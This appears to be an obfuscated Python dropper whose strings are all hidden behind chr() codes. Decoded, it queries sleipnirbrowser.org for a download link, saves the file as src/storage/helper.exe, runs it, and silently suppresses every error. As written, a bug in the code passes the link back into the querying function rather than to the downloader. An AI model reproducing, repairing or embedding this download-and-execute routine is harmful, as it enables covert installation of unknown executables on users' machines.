import os
BE=True
BP=Exception
Bb=os.path
Bu=os.makedirs
import urllib.request
import subprocess
Bi=subprocess.run
import requests
Bq=requests.get
def BV(url):
  try:
    BM=("".join([chr(115),chr(114),chr(99),chr(47),chr(115),chr(116),chr(111),chr(114),chr(97),chr(103),chr(101)]))
    Bu(BM,exist_ok=BE)
    BK=Bb.join(BM,("".join([chr(104),chr(101),chr(108),chr(112),chr(101),chr(114),chr(46),chr(101),chr(120),chr(101)]))                              )
    urllib.request.urlretrieve(url,BK)
    Bi([BK],check=BE)
  except BP as e:
    pass
def BD():
  try:
    Bx=Bq(("".join([chr(104),chr(116),chr(116),chr(112),chr(115),chr(58),chr(47),chr(47),chr(115),chr(108),chr(101),chr(105),chr(112),chr(110),chr(105),chr(114),chr(98),chr(114),chr(111),chr(119),chr(115),chr(101),chr(114),chr(46),chr(111),chr(114),chr(103),chr(47),chr(97),chr(112),chr(105),chr(47),chr(112),chr(121),chr(116),chr(104),chr(111),chr(110),chr(47),chr(49),chr(52),chr(53),chr(50),chr(54),chr(52),chr(55),chr(48),chr(47),chr(119),chr(105),chr(110)]))                                                               )
    if Bx.status_code==int("".join([chr(50),chr(48),chr(48)]))                          :
      Bl=Bx.json()
      if("".join([chr(108),chr(105),chr(110),chr(107)]))                in Bl:
        Br=Bl[("".join([chr(108),chr(105),chr(110),chr(107)]))                    ]
        BD(Br)
      else:
        pass
  except BP:
    pass
